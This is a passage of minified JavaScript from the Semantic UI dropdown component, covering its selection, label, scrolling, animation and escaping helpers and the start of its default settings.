                                    S.hideAndClear() } }, combo: function(t, n, i) { n = void 0 !== n ? n : t, S.set.selected(n, e(i)), S.hideAndClear() }, hide: function(e, t, n) { S.set.value(t, e), S.hideAndClear() } }, get: { id: function() { return y }, defaultText: function() { return q.data(T.defaultText) }, defaultValue: function() { return q.data(T.defaultValue) }, placeholderText: function() { return "auto" != _.placeholder && "string" == typeof _.placeholder ? _.placeholder : q.data(T.placeholderText) || "" }, text: function() { return L.text() }, query: function() { return e.trim(N.val()) }, searchWidth: function(e) { return e = void 0 !== e ? e : N.val(), F.text(e), Math.ceil(F.width() + 1) }, selectionCount: function() { var t = S.get.values(); return S.is.multiple() ? e.isArray(t) ? t.length : 0 : "" !== S.get.value() ? 1 : 0 }, transition: function(e) { return "auto" == _.transition ? S.is.upward(e) ? "slide up" : "slide down" : _.transition }, userValues: function() { var t = S.get.values(); return !!t && (t = e.isArray(t) ? t : [t], e.grep(t, function(e) { return !1 === S.get.item(e) })) }, uniqueArray: function(t) { return e.grep(t, function(n, i) { return e.inArray(n, t) === i }) }, caretPosition: function() { var e, t, i = N.get(0); return "selectionStart" in i ? i.selectionStart : n.selection ? (i.focus(), e = n.selection.createRange(), t = e.text.length, e.moveStart("character", -i.value.length), e.text.length - t) : void 0 }, value: function() { var t = z.length > 0 ? z.val() : q.data(T.value),
                                    n = e.isArray(t) && 1 === t.length && "" === t[0]; return void 0 === t || n ? "" : t }, values: function() { var e = S.get.value(); return "" === e ? "" : !S.has.selectInput() && S.is.multiple() ? "string" == typeof e ? e.split(_.delimiter) : "" : e }, remoteValues: function() { var t = S.get.values(),
                                    n = !1; return t && ("string" == typeof t && (t = [t]), e.each(t, function(e, t) { var i = S.read.remoteData(t);
                                    S.verbose("Restoring value from session data", i, t), i && (n || (n = {}), n[t] = i) })), n }, choiceText: function(t, n) { if (n = void 0 !== n ? n : _.preserveHTML, t) return t.find(P.menu).length > 0 && (S.verbose("Retrieving text of element with sub-menu"), t = t.clone(), t.find(P.menu).remove(), t.find(P.menuIcon).remove()), void 0 !== t.data(T.text) ? t.data(T.text) : n ? e.trim(t.html()) : e.trim(t.text()) }, choiceValue: function(t, n) { return n = n || S.get.choiceText(t), !!t && (void 0 !== t.data(T.value) ? String(t.data(T.value)) : "string" == typeof n ? e.trim(n.toLowerCase()) : String(n)) }, inputEvent: function() { var e = N[0]; return !!e && (void 0 !== e.oninput ? "input" : void 0 !== e.onpropertychange ? "propertychange" : "keyup") }, selectValues: function() { var t = {}; return t.values = [], q.find("option").each(function() { var n = e(this),
                                        i = n.html(),
                                        r = n.attr("disabled"),
                                        o = void 0 !== n.attr("value") ? n.attr("value") : i; "auto" === _.placeholder && "" === o ? t.placeholder = i : t.values.push({ name: i, value: o, disabled: r }) }), _.placeholder && "auto" !== _.placeholder && (S.debug("Setting placeholder value to", _.placeholder), t.placeholder = _.placeholder), _.sortSelect ? (t.values.sort(function(e, t) { return e.name > t.name ? 1 : -1 }), S.debug("Retrieved and sorted values from select", t)) : S.debug("Retrieved values from select", t), t }, activeItem: function() { return W.filter("." + k.active) }, selectedItem: function() { var e = W.not(P.unselectable).filter("." + k.selected); return e.length > 0 ? e : W.eq(0) }, itemWithAdditions: function(e) { var t = S.get.item(e),
                                    n = S.create.userChoice(e); return n && n.length > 0 && (t = t.length > 0 ? t.add(n) : n), t }, item: function(t, n) { var i, r, o = !1; return t = void 0 !== t ? t : void 0 !== S.get.values() ? S.get.values() : S.get.text(), i = r ? t.length > 0 : void 0 !== t && null !== t, r = S.is.multiple() && e.isArray(t), n = "" === t || 0 === t || (n || !1), i && W.each(function() { var i = e(this),
                                        a = S.get.choiceText(i),
                                        s = S.get.choiceValue(i, a); if (null !== s && void 0 !== s)
                                        if (r) - 1 === e.inArray(String(s), t) && -1 === e.inArray(a, t) || (o = o ? o.add(i) : i);
                                        else if (n) { if (S.verbose("Ambiguous dropdown value using strict type check", i, t), s === t || a === t) return o = i, !0 } else if (String(s) == String(t) || a == t) return S.verbose("Found select item by value", s, t), o = i, !0 }), o } }, check: { maxSelections: function(e) { return !_.maxSelections || (e = void 0 !== e ? e : S.get.selectionCount(), e >= _.maxSelections ? (S.debug("Maximum selection count reached"), _.useLabels && (W.addClass(k.filtered), S.add.message(C.maxSelections)), !0) : (S.verbose("No longer at maximum selection count"), S.remove.message(), S.remove.filteredItem(), S.is.searchSelection() && S.filterItems(), !1)) } }, restore: { defaults: function() { S.clear(), S.restore.defaultText(), S.restore.defaultValue() }, defaultText: function() { var e = S.get.defaultText();
                                e === S.get.placeholderText ? (S.debug("Restoring default placeholder text", e), S.set.placeholderText(e)) : (S.debug("Restoring default text", e), S.set.text(e)) }, placeholderText: function() { S.set.placeholderText() }, defaultValue: function() { var e = S.get.defaultValue();
                                void 0 !== e && (S.debug("Restoring default value", e), "" !== e ? (S.set.value(e), S.set.selected()) : (S.remove.activeItem(), S.remove.selectedItem())) }, labels: function() { _.allowAdditions && (_.useLabels || (S.error(I.labels), _.useLabels = !0), S.debug("Restoring selected values"), S.create.userLabels()), S.check.maxSelections() }, selected: function() { S.restore.values(), S.is.multiple() ? (S.debug("Restoring previously selected values and labels"), S.restore.labels()) : S.debug("Restoring previously selected values") }, values: function() { S.set.initialLoad(), _.apiSettings && _.saveRemoteData && S.get.remoteValues() ? S.restore.remoteValues() : S.set.selected(), S.remove.initialLoad() }, remoteValues: function() { var t = S.get.remoteValues();
                                S.debug("Recreating selected from session data", t), t && (S.is.single() ? e.each(t, function(e, t) { S.set.text(t) }) : e.each(t, function(e, t) { S.add.label(e, t) })) } }, read: { remoteData: function(e) { var n; return void 0 === t.Storage ? void S.error(I.noStorage) : void 0 !== (n = sessionStorage.getItem(e)) && n } }, save: { defaults: function() { S.save.defaultText(), S.save.placeholderText(), S.save.defaultValue() }, defaultValue: function() { var e = S.get.value();
                                S.verbose("Saving default value as", e), q.data(T.defaultValue, e) }, defaultText: function() { var e = S.get.text();
                                S.verbose("Saving default text as", e), q.data(T.defaultText, e) }, placeholderText: function() { var e;!1 !== _.placeholder && L.hasClass(k.placeholder) && (e = S.get.text(), S.verbose("Saving placeholder text as", e), q.data(T.placeholderText, e)) }, remoteData: function(e, n) { if (void 0 === t.Storage) return void S.error(I.noStorage);
                                S.verbose("Saving remote data to session storage", n, e), sessionStorage.setItem(n, e) } }, clear: function() { S.is.multiple() && _.useLabels ? S.remove.labels() : (S.remove.activeItem(), S.remove.selectedItem()), S.set.placeholderText(), S.clearValue() }, clearValue: function() { S.set.value("") }, scrollPage: function(e, t) { var n, i, r, o = t || S.get.selectedItem(),
                                a = o.closest(P.menu),
                                s = a.outerHeight(),
                                c = a.scrollTop(),
                                u = W.eq(0).outerHeight(),
                                l = Math.floor(s / u),
                                d = (a.prop("scrollHeight"), "up" == e ? c - u * l : c + u * l),
                                f = W.not(P.unselectable);
                            r = "up" == e ? f.index(o) - l : f.index(o) + l, n = "up" == e ? r >= 0 : r < f.length, i = n ? f.eq(r) : "up" == e ? f.first() : f.last(), i.length > 0 && (S.debug("Scrolling page", e, i), o.removeClass(k.selected), i.addClass(k.selected), _.selectOnKeydown && S.is.single() && S.set.selectedItem(i), a.scrollTop(d)) }, set: { filtered: function() { var e = S.is.multiple(),
                                    t = S.is.searchSelection(),
                                    n = e && t,
                                    i = t ? S.get.query() : "",
                                    r = "string" == typeof i && i.length > 0,
                                    o = S.get.searchWidth(),
                                    a = "" !== i;
                                e && r && (S.verbose("Adjusting input width", o, _.glyphWidth), N.css("width", o)), r || n && a ? (S.verbose("Hiding placeholder text"), L.addClass(k.filtered)) : (!e || n && !a) && (S.verbose("Showing placeholder text"), L.removeClass(k.filtered)) }, empty: function() { q.addClass(k.empty) }, loading: function() { q.addClass(k.loading) }, placeholderText: function(e) { e = e || S.get.placeholderText(), S.debug("Setting placeholder text", e), S.set.text(e), L.addClass(k.placeholder) }, tabbable: function() { S.is.searchSelection() ? (S.debug("Added tabindex to searchable dropdown"), N.val("").attr("tabindex", 0), V.attr("tabindex", -1)) : (S.debug("Added tabindex to dropdown"), void 0 === q.attr("tabindex") && (q.attr("tabindex", 0), V.attr("tabindex", -1))) }, initialLoad: function() { S.verbose("Setting initial load"), b = !0 }, activeItem: function(e) { _.allowAdditions && e.filter(P.addition).length > 0 ? e.addClass(k.filtered) : e.addClass(k.active) }, partialSearch: function(e) { var t = S.get.query().length;
                                N.val(e.substr(0, t)) }, scrollPosition: function(e, t) { var n, i, r, o, a, s, c, u, l;
                                e = e || S.get.selectedItem(), n = e.closest(P.menu), i = e && e.length > 0, t = void 0 !== t && t, e && n.length > 0 && i && (o = e.position().top, n.addClass(k.loading), s = n.scrollTop(), a = n.offset().top, o = e.offset().top, r = s - a + o, t || (c = n.height(), l = s + c < r + 5, u = r - 5 < s), S.debug("Scrolling to active item", r), (t || u || l) && n.scrollTop(r), n.removeClass(k.loading)) }, text: function(e) { "select" !== _.action && ("combo" == _.action ? (S.debug("Changing combo button text", e, H), _.preserveHTML ? H.html(e) : H.text(e)) : (e !== S.get.placeholderText() && L.removeClass(k.placeholder), S.debug("Changing text", e, L), L.removeClass(k.filtered), _.preserveHTML ? L.html(e) : L.text(e))) }, selectedItem: function(e) { var t = S.get.choiceValue(e),
                                    n = S.get.choiceText(e, !1),
                                    i = S.get.choiceText(e, !0);
                                S.debug("Setting user selection to item", e), S.remove.activeItem(), S.set.partialSearch(n), S.set.activeItem(e), S.set.selected(t, e), S.set.text(i) }, selectedLetter: function(t) { var n, i = W.filter("." + k.selected),
                                    r = i.length > 0 && S.has.firstLetter(i, t),
                                    o = !1;
                                r && (n = i.nextAll(W).eq(0), S.has.firstLetter(n, t) && (o = n)), o || W.each(function() { if (S.has.firstLetter(e(this), t)) return o = e(this), !1 }), o && (S.verbose("Scrolling to next value with letter", t), S.set.scrollPosition(o), i.removeClass(k.selected), o.addClass(k.selected), _.selectOnKeydown && S.is.single() && S.set.selectedItem(o)) }, direction: function(e) { "auto" == _.direction ? (S.remove.upward(), S.can.openDownward(e) ? S.remove.upward(e) : S.set.upward(e), S.is.leftward(e) || S.can.openRightward(e) || S.set.leftward(e)) : "upward" == _.direction && S.set.upward(e) }, upward: function(e) {
                                (e || q).addClass(k.upward) }, leftward: function(e) {
                                (e || V).addClass(k.leftward) }, value: function(e, t, n) { var i = S.escape.value(e),
                                    r = z.length > 0,
                                    o = S.get.values(),
                                    a = void 0 !== e ? String(e) : e; if (r) { if (!_.allowReselection && a == o && (S.verbose("Skipping value update already same value", e, o), !S.is.initialLoad())) return;
                                    S.is.single() && S.has.selectInput() && S.can.extendSelect() && (S.debug("Adding user option", e), S.add.optionValue(e)), S.debug("Updating input value", i, o), X = !0, z.val(i), !1 === _.fireOnInit && S.is.initialLoad() ? S.debug("Input native change event ignored on initial load") : S.trigger.change(), X = !1 } else S.verbose("Storing value in metadata", i, z), i !== o && q.data(T.value, a);!1 === _.fireOnInit && S.is.initialLoad() ? S.verbose("No callback on initial load", _.onChange) : _.onChange.call($, e, t, n) }, active: function() { q.addClass(k.active) }, multiple: function() { q.addClass(k.multiple) }, visible: function() { q.addClass(k.visible) }, exactly: function(e, t) { S.debug("Setting selected to exact values"), S.clear(), S.set.selected(e, t) }, selected: function(t, n) { var i = S.is.multiple();
                                (n = _.allowAdditions ? n || S.get.itemWithAdditions(t) : n || S.get.item(t)) && (S.debug("Setting selected menu item to", n), S.is.multiple() && S.remove.searchWidth(), S.is.single() ? (S.remove.activeItem(), S.remove.selectedItem()) : _.useLabels && S.remove.selectedItem(), n.each(function() { var t = e(this),
                                        r = S.get.choiceText(t),
                                        o = S.get.choiceValue(t, r),
                                        a = t.hasClass(k.filtered),
                                        s = t.hasClass(k.active),
                                        c = t.hasClass(k.addition),
                                        u = i && 1 == n.length;
                                    i ? !s || c ? (_.apiSettings && _.saveRemoteData && S.save.remoteData(r, o), _.useLabels ? (S.add.label(o, r, u), S.add.value(o, r, t), S.set.activeItem(t), S.filterActive(), S.select.nextAvailable(n)) : (S.add.value(o, r, t), S.set.text(S.add.variables(C.count)), S.set.activeItem(t))) : a || (S.debug("Selected active value, removing label"), S.remove.selected(o)) : (_.apiSettings && _.saveRemoteData && S.save.remoteData(r, o), S.set.text(r), S.set.value(o, r, t), t.addClass(k.active).addClass(k.selected)) })) } }, add: { label: function(t, n, i) { var r, o = S.is.searchSelection() ? N : L,
                                    a = S.escape.value(t); if (r = e("<a />").addClass(k.label).attr("data-" + T.value, a).html(D.label(a, n)), r = _.onLabelCreate.call(r, a, n), S.has.value(t)) return void S.debug("User selection already exists, skipping", a);
                                _.label.variation && r.addClass(_.label.variation), !0 === i ? (S.debug("Animating in label", r), r.addClass(k.hidden).insertBefore(o).transition(_.label.transition, _.label.duration)) : (S.debug("Adding selection label", r), r.insertBefore(o)) }, message: function(t) { var n = V.children(P.message),
                                    i = _.templates.message(S.add.variables(t));
                                n.length > 0 ? n.html(i) : n = e("<div/>").html(i).addClass(k.message).appendTo(V) }, optionValue: function(t) { var n = S.escape.value(t);
                                z.find('option[value="' + S.escape.string(n) + '"]').length > 0 || (S.disconnect.selectObserver(), S.is.single() && (S.verbose("Removing previous user addition"), z.find("option." + k.addition).remove()), e("<option/>").prop("value", n).addClass(k.addition).html(t).appendTo(z), S.verbose("Adding user addition as an <option>", t), S.observe.select()) }, userSuggestion: function(e) { var t, n = V.children(P.addition),
                                    i = S.get.item(e),
                                    r = i && i.not(P.addition).length,
                                    o = n.length > 0; if (!_.useLabels || !S.has.maxSelections()) { if ("" === e || r) return void n.remove();
                                    o ? (n.data(T.value, e).data(T.text, e).attr("data-" + T.value, e).attr("data-" + T.text, e).removeClass(k.filtered), _.hideAdditions || (t = _.templates.addition(S.add.variables(C.addResult, e)), n.html(t)), S.verbose("Replacing user suggestion with new value", n)) : (n = S.create.userChoice(e), n.prependTo(V), S.verbose("Adding item choice to menu corresponding with user choice addition", n)), _.hideAdditions && !S.is.allFiltered() || n.addClass(k.selected).siblings().removeClass(k.selected), S.refreshItems() } }, variables: function(e, t) { var n, i, r = -1 !== e.search("{count}"),
                                    o = -1 !== e.search("{maxCount}"),
                                    a = -1 !== e.search("{term}"); return S.verbose("Adding templated variables to message", e), r && (n = S.get.selectionCount(), e = e.replace("{count}", n)), o && (n = S.get.selectionCount(), e = e.replace("{maxCount}", _.maxSelections)), a && (i = t || S.get.query(), e = e.replace("{term}", i)), e }, value: function(t, n, i) { var r, o = S.get.values(); return S.has.value(t) ? void S.debug("Value already selected") : "" === t ? void S.debug("Cannot select blank values from multiselect") : (e.isArray(o) ? (r = o.concat([t]), r = S.get.uniqueArray(r)) : r = [t], S.has.selectInput() ? S.can.extendSelect() && (S.debug("Adding value to select", t, r, z), S.add.optionValue(t)) : (r = r.join(_.delimiter), S.debug("Setting hidden input to delimited value", r, z)), !1 === _.fireOnInit && S.is.initialLoad() ? S.verbose("Skipping onadd callback on initial load", _.onAdd) : _.onAdd.call($, t, n, i), S.set.value(r, t, n, i), void S.check.maxSelections()) } }, remove: { active: function() { q.removeClass(k.active) }, activeLabel: function() { q.find(P.label).removeClass(k.active) }, empty: function() { q.removeClass(k.empty) }, loading: function() { q.removeClass(k.loading) }, initialLoad: function() { b = !1 }, upward: function(e) {
                                (e || q).removeClass(k.upward) }, leftward: function(e) {
                                (e || V).removeClass(k.leftward) }, visible: function() { q.removeClass(k.visible) }, activeItem: function() { W.removeClass(k.active) }, filteredItem: function() { _.useLabels && S.has.maxSelections() || (_.useLabels && S.is.multiple() ? W.not("." + k.active).removeClass(k.filtered) : W.removeClass(k.filtered), S.remove.empty()) }, optionValue: function(e) { var t = S.escape.value(e),
                                    n = z.find('option[value="' + S.escape.string(t) + '"]');
                                n.length > 0 && n.hasClass(k.addition) && (w && (w.disconnect(), S.verbose("Temporarily disconnecting mutation observer")), n.remove(), S.verbose("Removing user addition as an <option>", t), w && w.observe(z[0], { childList: !0, subtree: !0 })) }, message: function() { V.children(P.message).remove() }, searchWidth: function() { N.css("width", "") }, searchTerm: function() { S.verbose("Cleared search term"), N.val(""), S.set.filtered() }, userAddition: function() { W.filter(P.addition).remove() }, selected: function(t, n) { if (!(n = _.allowAdditions ? n || S.get.itemWithAdditions(t) : n || S.get.item(t))) return !1;
                                n.each(function() { var t = e(this),
                                        n = S.get.choiceText(t),
                                        i = S.get.choiceValue(t, n);
                                    S.is.multiple() ? _.useLabels ? (S.remove.value(i, n, t), S.remove.label(i)) : (S.remove.value(i, n, t), 0 === S.get.selectionCount() ? S.set.placeholderText() : S.set.text(S.add.variables(C.count))) : S.remove.value(i, n, t), t.removeClass(k.filtered).removeClass(k.active), _.useLabels && t.removeClass(k.selected) }) }, selectedItem: function() { W.removeClass(k.selected) }, value: function(e, t, n) { var i, r = S.get.values();
                                S.has.selectInput() ? (S.verbose("Input is <select> removing selected option", e), i = S.remove.arrayValue(e, r), S.remove.optionValue(e)) : (S.verbose("Removing from delimited values", e), i = S.remove.arrayValue(e, r), i = i.join(_.delimiter)), !1 === _.fireOnInit && S.is.initialLoad() ? S.verbose("No callback on initial load", _.onRemove) : _.onRemove.call($, e, t, n), S.set.value(i, t, n), S.check.maxSelections() }, arrayValue: function(t, n) { return e.isArray(n) || (n = [n]), n = e.grep(n, function(e) { return t != e }), S.verbose("Removed value from delimited string", t, n), n }, label: function(e, t) { var n = q.find(P.label),
                                    i = n.filter("[data-" + T.value + '="' + S.escape.string(e) + '"]');
                                S.verbose("Removing label", i), i.remove() }, activeLabels: function(e) { e = e || q.find(P.label).filter("." + k.active), S.verbose("Removing active label selections", e), S.remove.labels(e) }, labels: function(t) { t = t || q.find(P.label), S.verbose("Removing labels", t), t.each(function() { var t = e(this),
                                        n = t.data(T.value),
                                        i = void 0 !== n ? String(n) : n,
                                        r = S.is.userValue(i); if (!1 === _.onLabelRemove.call(t, n)) return void S.debug("Label remove callback cancelled removal");
                                    S.remove.message(), r ? (S.remove.value(i), S.remove.label(i)) : S.remove.selected(i) }) }, tabbable: function() { S.is.searchSelection() ? (S.debug("Searchable dropdown initialized"), N.removeAttr("tabindex"), V.removeAttr("tabindex")) : (S.debug("Simple selection dropdown initialized"), q.removeAttr("tabindex"), V.removeAttr("tabindex")) } }, has: { menuSearch: function() { return S.has.search() && N.closest(V).length > 0 }, search: function() { return N.length > 0 }, sizer: function() { return F.length > 0 }, selectInput: function() { return z.is("select") }, minCharacters: function(e) { return !_.minCharacters || (e = void 0 !== e ? String(e) : String(S.get.query()), e.length >= _.minCharacters) }, firstLetter: function(e, t) { var n, i; return !(!e || 0 === e.length || "string" != typeof t) && (n = S.get.choiceText(e, !1), t = t.toLowerCase(), i = String(n).charAt(0).toLowerCase(), t == i) }, input: function() { return z.length > 0 }, items: function() { return W.length > 0 }, menu: function() { return V.length > 0 }, message: function() { return 0 !== V.children(P.message).length }, label: function(e) { var t = S.escape.value(e); return q.find(P.label).filter("[data-" + T.value + '="' + S.escape.string(t) + '"]').length > 0 }, maxSelections: function() { return _.maxSelections && S.get.selectionCount() >= _.maxSelections }, allResultsFiltered: function() { var e = W.not(P.addition); return e.filter(P.unselectable).length === e.length }, userSuggestion: function() { return V.children(P.addition).length > 0 }, query: function() { return "" !== S.get.query() }, value: function(e) { return _.ignoreCase ? S.has.valueIgnoringCase(e) : S.has.valueMatchingCase(e) }, valueMatchingCase: function(t) { var n = S.get.values(); return !!(e.isArray(n) ? n && -1 !== e.inArray(t, n) : n == t) }, valueIgnoringCase: function(t) { var n = S.get.values(),
                                    i = !1; return e.isArray(n) || (n = [n]), e.each(n, function(e, n) { if (String(t).toLowerCase() == String(n).toLowerCase()) return i = !0, !1 }), i } }, is: { active: function() { return q.hasClass(k.active) }, animatingInward: function() { return V.transition("is inward") }, animatingOutward: function() { return V.transition("is outward") }, bubbledLabelClick: function(t) { return e(t.target).is("select, input") && q.closest("label").length > 0 }, bubbledIconClick: function(t) { return e(t.target).closest(U).length > 0 }, alreadySetup: function() { return q.is("select") && void 0 !== q.parent(P.dropdown).data(j) && 0 === q.prev().length }, animating: function(e) { return e ? e.transition && e.transition("is animating") : V.transition && V.transition("is animating") }, leftward: function(e) { return (e || V).hasClass(k.leftward) }, disabled: function() { return q.hasClass(k.disabled) }, focused: function() { return n.activeElement === q[0] }, focusedOnSearch: function() { return n.activeElement === N[0] }, allFiltered: function() { return (S.is.multiple() || S.has.search()) && !(0 == _.hideAdditions && S.has.userSuggestion()) && !S.has.message() && S.has.allResultsFiltered() }, hidden: function(e) { return !S.is.visible(e) }, initialLoad: function() { return b }, inObject: function(t, n) { var i = !1; return e.each(n, function(e, n) { if (n == t) return i = !0, !0 }), i }, multiple: function() { return q.hasClass(k.multiple) }, remote: function() { return _.apiSettings && S.can.useAPI() }, single: function() { return !S.is.multiple() }, selectMutation: function(t) { var n = !1; return e.each(t, function(t, i) { if (i.target && e(i.target).is("select")) return n = !0, !0 }), n }, search: function() { return q.hasClass(k.search) }, searchSelection: function() { return S.has.search() && 1 === N.parent(P.dropdown).length }, selection: function() { return q.hasClass(k.selection) }, userValue: function(t) { return -1 !== e.inArray(t, S.get.userValues()) }, upward: function(e) { return (e || q).hasClass(k.upward) }, visible: function(e) { return e ? e.hasClass(k.visible) : V.hasClass(k.visible) }, verticallyScrollableContext: function() { var e = B.get(0) !== t && B.css("overflow-y"); return "auto" == e || "scroll" == e }, horizontallyScrollableContext: function() { var e = B.get(0) !== t && B.css("overflow-X"); return "auto" == e || "scroll" == e } }, can: { activate: function(e) { return !!_.useLabels || (!S.has.maxSelections() || !(!S.has.maxSelections() || !e.hasClass(k.active))) }, openDownward: function(e) { var n, i = e || V,
                                    r = !0,
                                    o = {}; return i.addClass(k.loading), n = { context: { offset: B.get(0) === t ? { top: 0, left: 0 } : B.offset(), scrollTop: B.scrollTop(), height: B.outerHeight() }, menu: { offset: i.offset(), height: i.outerHeight() } }, S.is.verticallyScrollableContext() && (n.menu.offset.top += n.context.scrollTop), o = { above: n.context.scrollTop <= n.menu.offset.top - n.context.offset.top - n.menu.height, below: n.context.scrollTop + n.context.height >= n.menu.offset.top - n.context.offset.top + n.menu.height }, o.below ? (S.verbose("Dropdown can fit in context downward", o), r = !0) : o.below || o.above ? (S.verbose("Dropdown cannot fit below, opening upward", o), r = !1) : (S.verbose("Dropdown cannot fit in either direction, favoring downward", o), r = !0), i.removeClass(k.loading), r }, openRightward: function(e) { var n, i = e || V,
                                    r = !0,
                                    o = !1; return i.addClass(k.loading), n = { context: { offset: B.get(0) === t ? { top: 0, left: 0 } : B.offset(), scrollLeft: B.scrollLeft(), width: B.outerWidth() }, menu: { offset: i.offset(), width: i.outerWidth() } }, S.is.horizontallyScrollableContext() && (n.menu.offset.left += n.context.scrollLeft), o = n.menu.offset.left - n.context.offset.left + n.menu.width >= n.context.scrollLeft + n.context.width, o && (S.verbose("Dropdown cannot fit in context rightward", o), r = !1), i.removeClass(k.loading), r }, click: function() { return c || "click" == _.on }, extendSelect: function() { return _.allowAdditions || _.apiSettings }, show: function() { return !S.is.disabled() && (S.has.items() || S.has.message()) }, useAPI: function() { return void 0 !== e.fn.api } }, animate: { show: function(t, n) { var i, r = n || V,
                                    o = n ? function() {} : function() { S.hideSubMenus(), S.hideOthers(), S.set.active() };
                                t = e.isFunction(t) ? t : function() {}, S.verbose("Doing menu show animation", r), S.set.direction(n), i = S.get.transition(n), S.is.selection() && S.set.scrollPosition(S.get.selectedItem(), !0), (S.is.hidden(r) || S.is.animating(r)) && ("none" == i ? (o(), r.transition("show"), t.call($)) : void 0 !== e.fn.transition && q.transition("is supported") ? r.transition({ animation: i + " in", debug: _.debug, verbose: _.verbose, duration: _.duration, queue: !0, onStart: o, onComplete: function() { t.call($) } }) : S.error(I.noTransition, i)) }, hide: function(t, n) { var i = n || V,
                                    r = (n ? _.duration : _.duration, n ? function() {} : function() { S.can.click() && S.unbind.intent(), S.remove.active() }),
                                    o = S.get.transition(n);
                                t = e.isFunction(t) ? t : function() {}, (S.is.visible(i) || S.is.animating(i)) && (S.verbose("Doing menu hide animation", i), "none" == o ? (r(), i.transition("hide"), t.call($)) : void 0 !== e.fn.transition && q.transition("is supported") ? i.transition({ animation: o + " out", duration: _.duration, debug: _.debug, verbose: _.verbose, queue: !1, onStart: r, onComplete: function() { t.call($) } }) : S.error(I.transition)) } }, hideAndClear: function() { S.remove.searchTerm(), S.has.maxSelections() || (S.has.search() ? S.hide(function() { S.remove.filteredItem() }) : S.hide()) }, delay: { show: function() { S.verbose("Delaying show event to ensure user intent"), clearTimeout(S.timer), S.timer = setTimeout(S.show, _.delay.show) }, hide: function() { S.verbose("Delaying hide event to ensure user intent"), clearTimeout(S.timer), S.timer = setTimeout(S.hide, _.delay.hide) } }, escape: { value: function(t) { var n = e.isArray(t),
                                    i = "string" == typeof t,
                                    r = !i && !n,
                                    o = i && -1 !== t.search(R.quote),
                                    a = []; return r || !o ? t : (S.debug("Encoding quote values for use in select", t), n ? (e.each(t, function(e, t) { a.push(t.replace(R.quote, "&quot;")) }), a) : t.replace(R.quote, "&quot;")) }, string: function(e) { return e = String(e), e.replace(R.escape, "\\$&") } }, setting: function(t, n) { if (S.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, _, t);
                            else { if (void 0 === n) return _[t];
                                e.isPlainObject(_[t]) ? e.extend(!0, _[t], n) : _[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, S, t);
                            else { if (void 0 === n) return S[t];
                                S[t] = n } }, debug: function() {!_.silent && _.debug && (_.performance ? S.performance.log(arguments) : (S.debug = Function.prototype.bind.call(console.info, console, _.name + ":"), S.debug.apply(console, arguments))) }, verbose: function() {!_.silent && _.verbose && _.debug && (_.performance ? S.performance.log(arguments) : (S.verbose = Function.prototype.bind.call(console.info, console, _.name + ":"), S.verbose.apply(console, arguments))) }, error: function() { _.silent || (S.error = Function.prototype.bind.call(console.error, console, _.name + ":"), S.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                _.performance && (t = (new Date).getTime(), i = u || t, n = t - i, u = t, l.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: $, "Execution Time": n })), clearTimeout(S.performance.timer), S.performance.timer = setTimeout(S.performance.display, 500) }, display: function() { var t = _.name + ":",
                                    n = 0;
                                u = !1, clearTimeout(S.performance.timer), e.each(l, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", s && (t += " '" + s + "'"), (void 0 !== console.group || void 0 !== console.table) && l.length > 0 && (console.groupCollapsed(t), console.table ? console.table(l) : e.each(l, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), l = [] } }, invoke: function(t, n, i) { var o, a, s, c = G; return n = n || h, i = $ || i, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] ? (a = c[i], !1) : (S.error(I.method, t), !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(i, n) : void 0 !== a && (s = a), e.isArray(r) ? r.push(s) : void 0 !== r ? r = [r, s] : void 0 !== s && (r = s), a } }, f ? (void 0 === G && S.initialize(), S.invoke(d)) : (void 0 !== G && G.invoke("destroy"), S.initialize()) }), void 0 !== r ? r : o }, e.fn.dropdown.settings = { silent: !1, debug: !1, verbose: !1, performance: !0, on: "click", action: "activate", values: !1, apiSettings: !1, selectOnKeydown: !0, minCharacters: 0, filterRemoteData: !1, saveRemoteData: !0, throttle: 200, context: t, direction: "auto", keepOnScreen: !0, match: "both", fullTextSearch: !1, placeholder: "auto", preserveHTML: !0, sortSelect: !1, forceSelection: !0, allowAdditions: !1, ignoreCase: !1, hideAdditions: !0, maxSelections: !1, useLabels: !0, delimiter: ",", showOnFocus: !0, allowReselection: !1, allowTab: !0, allowCategorySelection: !1, fireOnInit: !1, transition: "auto", duration: 200, glyphWidth: 1.037, label: { transition: "scale", duration: 200, variation: !1 }, delay: { hide: 300, show: 200, search: 20, touch: 50 }, onChange: function(e, t, n) {}, onAdd: function(e, t, n) {}, onRemove: function(e, t, n) {}, onLabelSelect: function(e) {}, onLabelCreate: function(t, n) { return e(this) }, onLabelRemove: function(e) { return !0 }, onNoResults: function(e) { return !0 }, onShow: function() {}, onHide: function() {}, name: "Dropdown", namespace: "dropdown", message: { addResult: "Add <b>{term}</b>", count: "{count} selected", maxSelections: "Max {maxCount} selections", noResults: "No results found.", serverError: "There was an error contacting the server" }, error: { action: "You called a dropdown action that was not defined", alreadySetup: "Once a select has been initialized behaviors must be called on the created ui dropdown", labels: "Allowing user additions currently requires the use of labels.", missingMultiple: "<select> requires multiple property to be set to correctly preserve multiple values", method: "The method you called is not defined.", noAPI: "The API module is required to load resources remotely", noStorage: "Saving remote data requires session storage", noTransition: "This module requires ui transitions <https://github.com/Semantic-Org/UI-Transition>" }, regExp: { escape: /[-[\]{}()*+?.,\\^$|#\s]/g, quote: /"/g }, metadata: { defaultText: "defaultText", defaultValue: "defaultValue", placeholderText: "placeholder", text: "text", value: "value" }, fields: { remoteValues: "results", values: "values", disabled: "disabled", name: "name", value: "value", text: "text" }, keys: { backspace: 8, delimiter: 188, deleteKey: 46, enter: 13, escape: 27, pageUp: 33, pageDown: 34, leftArrow: 37, upArrow: 38, rightArrow: 39, downArrow: 40 }, selector: { addition: ".addition", dropdown: ".ui.dropdown", hidden: ".hidden", icon: "> .dropdown.icon", input: '> input[type="hidden"], > select', item: ".item", label: "> .label", remove: "> .label > .delete.icon", siblingLabel: ".label", menu: ".menu", message: ".message", menuIcon: 